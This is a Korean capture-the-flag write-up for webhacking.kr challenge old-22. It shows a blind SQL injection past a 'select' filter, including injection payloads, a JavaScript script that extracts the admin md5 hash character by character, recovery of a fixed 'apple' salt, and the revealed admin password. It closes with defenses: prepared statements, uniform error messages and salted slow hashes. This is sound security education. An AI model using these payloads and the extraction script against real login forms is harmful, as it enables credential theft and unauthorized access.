---
title: "webhacking.kr old-22 풀이 — select 필터를 만난 Blind SQLi와 비밀번호에 숨은 소금"
description: "webhacking.kr old-22를 푼다. union·select가 'no hack!'으로 막혀 UNION 인젝션이 봉쇄된 로그인에서, 'Wrong password!'와 'Login Fail!'이라는 두 응답 차이만으로 admin의 비밀번호 해시를 한 글자씩 복원한다. 거기에 이 문제의 함정 — 서버가 비밀번호에 'apple'을 덧붙여 해시한다는 사실 — 을 내 계정으로 직접 역산해 밝혀내고, 추측이 아니라 실제 요청·응답으로 통과(Pwned)까지 검증한 과정을 정리한다."
date: 2026-11-19
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, blind-sql-injection, md5, password-hashing, php, mysql]
---

> webhacking.kr은 합법적인 웹 보안 학습용 워게임이다. 이 글은 교육 목적의 풀이이며, 마지막에 같은 취약점을 어떻게 막는지도 정리했다.

[webhacking.kr](https://webhacking.kr)의 old-22 문제를 풀었다. 바로 앞 글 [old-21](/posts/2026-11-11-webhacking-kr-old-21)이 "응답 세 가지로 admin 비밀번호를 한 글자씩 빼내는 Blind SQL Injection"이었다면, old-22는 그 위에 두 겹의 함정을 더 얹는다. 하나는 `union`·`select`를 넣으면 `no hack!`으로 즉시 차단되어 그 흔한 UNION 인젝션이 봉쇄된다는 것, 다른 하나는 어렵게 비밀번호 해시를 빼내도 그 해시가 어떤 평범한 단어의 md5와도 맞지 않는다는 것이다. 서버가 비밀번호 뒤에 `apple`을 몰래 덧붙여 해시하고 있기 때문이다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-22 (`/challenge/bonus-2/`) |
| 배점 | 50점 |
| 유형 | Blind SQL Injection + 비밀번호 해시 복원 |
| 목표 | `admin`으로 로그인 |

화면은 단순하다. `username`·`password` 입력창과 `login`·`join` 버튼, 그리고 아래에 힌트 한 줄이다.

```html
<form method=post action=index.php>
  username <input name=uuid type=text>
  password <input name=pw type=password>
  <input type=submit value='login'>
  <input type=button value='join' onclick=location.href='?mode=join'>
</form>
mission : login as admin
Column Name : id, pw
```

`join`으로 계정을 만들 수 있고(`?mode=join`), `login`으로 로그인한다. 테이블 컬럼은 `id`, `pw` 둘뿐이라고 친절히 알려 준다. 우리가 만질 수 있는 입력은 POST의 `uuid`·`pw`이고, 목표는 `admin` 계정으로 로그인하는 것이다.

## 2. 먼저 UNION — 그리고 `no hack!`

컬럼이 `id`, `pw` 두 개라고 했으니, 로그인 쿼리는 `... where id='$uuid' ...` 꼴일 것이다. 가장 먼저 떠오르는 건 UNION으로 내가 원하는 id/pw 행을 통째로 지어내는 것이다. 바로 시도했다.

```text
POST /challenge/bonus-2/index.php
uuid=zzz' union select 'admin','...'-- -&pw=1
→ no hack!
```

`union select`가 들어가자마자 응답이 `no hack!` 한 줄로 바뀐다. 토큰을 하나씩 떼어 보면 범인이 보인다.

| `uuid` 페이로드 | 응답 |
| --- | --- |
| `zzz' union select 1-- -` | `no hack!` |
| `zzz' SELECT 1-- -` | `no hack!` |
| `zzz' sel/**/ect 1-- -` | `no hack!` |
| `zzz' UNION 1-- -` | *(걸리지 않음, 단 홀로는 문법 오류)* |

`select`가 대소문자·주석과 무관하게 걸린다. `SELECT`도, `sel/**/ect`처럼 주석을 끼운 변형도 모두 `no hack!`이다(서버가 `select`를 발견하면 `die`하는 것으로 보인다). UNION 인젝션은 반드시 `select`를 동반하므로, 이 필터 하나로 UNION 경로는 완전히 막힌다. `values ... row(...)` 같은 대체 구문도 이 서버에선 통하지 않았다.

> 교훈 하나. 필터가 막는 건 `select`지, SQL 인젝션 자체가 아니다. 행을 지어낼(UNION) 수 없을 뿐, 행이 조회되는지 여부는 여전히 응답으로 새어 나온다. 그럼 블라인드로 간다.

## 3. 오라클 세우기 — `Wrong password!` vs `Login Fail!`

따옴표를 넣어 인젝션 성립 여부부터 확인한다. 아래는 전부 실제 응답이다.

| `uuid` (pw=`x`) | 응답 | 해석 |
| --- | --- | --- |
| `admin` | `Login Fail!` | 평범한 로그인 실패 |
| `admin'` | `Login Fail!` | 따옴표 하나 → 쿼리 깨짐 |
| `admin'-- -` | **`Wrong password!`** | 뒤를 주석 처리 → `id='admin'` 행이 조회됨 |

`admin'`(깨짐)과 `admin'-- -`(정상)이 서로 다른 문구로 갈린다. 따옴표가 이스케이프되지 않고 그대로 들어간다는 뜻, 인젝션이 성립한다. 그리고 여기서 이 문제의 오라클이 드러난다. 조건을 `and`로 끼워 검증했다.

| `uuid` (pw=`x`) | 응답 | 판정 |
| --- | --- | --- |
| `admin' and 1=1-- -` | `Wrong password!` | **참** |
| `admin' and 1=2-- -` | `Login Fail!` | **거짓** |

깔끔하게 갈린다. 관찰로부터 로그인 로직을 복원하면 이렇다. webhacking.kr은 이 문제의 서버 소스를 공개하지 않으므로, 아래는 관찰로 복원한 의사 코드다.

```php
<?php
// uuid 가 그대로 삽입된다. pw 는 아래 4절에서 보듯 'apple'을 붙여 md5.
$q = "select id,pw from member where id='{$_GET['uuid']}' and pw='".md5($_POST['pw']."apple")."'";
$row = fetch($q);
if ($row) {
  if ($row['id'] == 'admin') { /* 통과 */ }
  else echo "Wrong password!";   // 행은 조회됐지만 admin 이 아님
} else {
  echo "Login Fail!";            // 조회된 행이 없음
}
?>
```

핵심은 내가 넣은 조건이 참이면 `admin` 행이 조회되고, 그 순간 응답이 `Wrong password!`로 바뀐다는 것이다. 조건이 참이면 `admin` 행 조회됨 → `Wrong password!`, 거짓이면 조회되는 행 없음 → `Login Fail!`. 참이면 `Wrong password!`, 거짓이면 `Login Fail!`라는 불리언 오라클이 생겼다(그리고 `no hack!`은 "필터에 걸림"이라는 제3의 상태다).

## 4. 비밀번호 해시 뽑아내기 — `length` + `substr`

먼저 길이. `length(pw)`를 물어본다.

```text
admin' and length(pw)=32-- -   → Wrong password!   (참)
admin' and length(pw)=16-- -   → Login Fail!        (거짓)
```

길이는 32자로 전형적인 md5 16진 해시다. 즉 `pw`에는 평문이 아니라 md5 결과가 담겨 있다. 이제 `substr(pw,i,1)`로 i번째 글자를 떼어 `0-9a-f` 범위에서 이진 탐색한다(응답에 `Wrong password!`가 있으면 참).

```js
const base = 'https://webhacking.kr/challenge/bonus-2/index.php';

// 조건이 참이면 true (Wrong password!), 거짓이면 false (Login Fail!)
async function isTrue(cond) {
  const body = new URLSearchParams({ uuid: "admin' and " + cond + "-- -", pw: 'x' });
  const t = await (await fetch(base, {
    method: 'POST', credentials: 'include',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body,
  })).text();
  return /Wrong password/.test(t);
}

let h = '';
for (let i = 1; i <= 32; i++) {
  let lo = 48, hi = 102;                         // '0'(48) ~ 'f'(102)
  while (lo < hi) {
    const mid = (lo + hi) >> 1;
    if (await isTrue(`ascii(substr(pw,${i},1))>${mid}`)) lo = mid + 1;
    else hi = mid;
  }
  h += String.fromCharCode(lo);
}
console.log(h);
```

돌리면 admin의 비밀번호 해시가 그대로 복원된다.

```text
6c9ca386a903921d7fa230ffa0ffc153
```

## 5. 함정 — 해시가 어떤 단어와도 맞지 않는다

해시를 얻었으니 평문을 복원하면 끝이라고 생각했지만, `6c9ca386a903921d7fa230ffa0ffc153`은 `admin`·`password`·숫자 수백만 개는 물론 공개 md5 역조회 DB에서도 나오지 않았다. 평범한 비밀번호의 md5가 아니라는 뜻이다. 여기서 추측 대신 직접 실험을 했다. `join`으로 내 비밀번호를 내가 아는 값으로 계정을 하나 만들고(예: `pw=a`), 그 계정의 `pw` 컬럼을 4절과 똑같은 방식으로 다시 뽑아 본 것이다.

```text
join: uuid=test, pw=a
→ 저장된 pw 해시(blind로 추출): 616dde04baf013e68816409e27633aa4
```

그런데 `md5("a")`는 `0cc175b9c0f1b6a831c399e269772661`이다. 내가 넣은 `a`의 md5와 저장값이 다르다. 평문을 아는 쪽에서 몇 가지를 맞춰 보니 정체가 드러났다.

```text
md5("a")       = 0cc175b9c0f1b6a831c399e269772661   (아님)
md5("aapple")  = 616dde04baf013e68816409e27633aa4   (일치!)
```

서버는 비밀번호 뒤에 고정 문자열 `apple`을 붙여 md5한다. `md5($pw . "apple")`, 일종의 (아주 허술한) 고정 소금이다. 그렇다면 admin의 해시도 같은 규칙일 테니, `어떤_단어 + "apple"`의 md5가 `6c9ca3...`과 맞는 평문만 찾으면 된다. 사전 대입을 돌렸다.

```text
md5("wowapple") = 6c9ca386a903921d7fa230ffa0ffc153   (일치!)
```

admin의 실제 비밀번호는 `wow`였다. 서버가 `wow`에 `apple`을 붙여 `md5("wowapple")`로 저장해 둔 것이다.

> 이 소금은 보안에 아무 도움이 안 된다. 모든 계정에 동일한 고정 문자열이라, 한 번만 알아내면 모든 해시에 그대로 적용된다. 내가 만든 `a`→`aapple` 한 쌍이 admin의 `wow`→`wowapple`을 그대로 풀어 줬다.

## 6. 결과 — admin으로 로그인

로그인은 입력 `pw`에 `apple`을 붙여 비교하므로, 접미사는 서버가 알아서 붙인다. 내가 넣을 값은 `wow`다.

```text
POST /challenge/bonus-2/index.php
uuid=admin&pw=wow
```

응답:

```console
hi! admin

your password hash : 6c9ca386a903921d7fa230ffa0ffc153

old-22 Pwned. You got 50point. Congratz!
```

`alert('old-22 Pwned!')`가 뜨고 50점이 올랐으며, `chall.php`에서도 `✔️ old-22`로 풀린 것을 확인했다. 접미사를 내가 또 붙여 `pw=wowapple`로 보내면 `md5("wowappleapple")`이 되어 실패한다. 접미사는 정확히 한 번만이다.

## 7. 왜 취약한가 — 그리고 올바른 방어

첫째, 근본 원인은 여전히 "입력을 쿼리 문자열에 섞는 것"이다. `where id='$uuid'`처럼 입력을 직접 끼워 넣으면, 따옴표 하나로 공격자가 쿼리의 구조를 바꾼다. `select`를 블랙리스트로 막는 건 증상 가리기일 뿐이고, 블라인드는 `select` 없이도 동작한다. 해법은 파라미터 바인딩(prepared statement)이다.

```php
$stmt = $db->prepare("select id, pw from member where id = ?");
$stmt->bind_param("s", $_POST['uuid']);   // uuid 는 데이터로만 바인딩
$stmt->execute();
```

둘째, 응답 문구가 곧 정보 유출 채널이다. `Wrong password!`(행 있음)와 `Login Fail!`(행 없음)을 다르게 돌려주는 순간, 결과를 숨겨도 참/거짓 한 비트가 매번 샌다. Blind 인젝션은 그 한 비트를 먹고 자란다. 로그인 실패는 "아이디 없음"과 "비밀번호 틀림"을 구분하지 말고 하나의 문구로 통일한다(사용자 열거도 함께 막힌다).

셋째, 고정 소금 md5는 소금이 아니다. `md5($pw . "apple")`은 세 가지가 전부 틀렸다. 소금이 모든 계정 공통이라 한 번 알면 전부 뚫리고, md5는 너무 빨라 무차별 대입에 약하며, 소금을 코드에 하드코딩했다. 비밀번호는 계정마다 임의 소금을 쓰는 느린 해시로 저장해야 한다.

```php
// 저장: 계정마다 임의 소금이 자동 포함된다
$hash = password_hash($pw, PASSWORD_DEFAULT);   // bcrypt/argon2
// 검증
if (password_verify($_POST['pw'], $row['hash'])) { /* ok */ }
```

이렇게 하면 설령 해시가 한 글자씩 새어도, 나오는 건 계정별로 다른 소금이 섞인 느린 해시라 사전 대입이 사실상 막힌다.

## 8. 정리

- old-22는 `select` 필터로 UNION을 막아 놓은 로그인이다. 하지만 필터는 인젝션을 막지 못한다. 행이 조회되는지 여부가 응답으로 샌다.
- 오라클은 `uuid`에 `admin' and (조건)-- -`을 넣으면 참이면 `Wrong password!`(admin 행 조회됨), 거짓이면 `Login Fail!`(행 없음)이다(`no hack!`은 필터에 걸린 제3의 상태).
- `length(pw)=32`로 md5임을, `ascii(substr(pw,i,1))` 이진 탐색으로 admin의 해시 `6c9ca386a903921d7fa230ffa0ffc153`를 복원했다.
- 그 해시가 어떤 평문의 md5와도 안 맞던 이유는 서버가 `md5($pw . "apple")`로 저장하기 때문이다. 내 계정(`a`→`md5("aapple")`)으로 규칙을 역산해, `md5("wowapple")`=admin 해시임을 확인하고 비밀번호 `wow`를 얻었다.
- `uuid=admin&pw=wow`로 로그인해 `old-22 Pwned. You got 50point.` 통과했다.
- 방어는 prepared statement, 실패 메시지 단일화, 계정별 임의 소금을 쓰는 느린 해시(bcrypt/argon2)다.

필터는 금지어를 지웠을 뿐, 질문하는 법을 막지는 못했다. 참과 거짓을 다르게 답하는 한, 숨긴 해시는 한 글자씩 빠져나오고, 모두에게 같은 소금은 한 사람 몫만 풀면 전부의 몫이 풀린다.
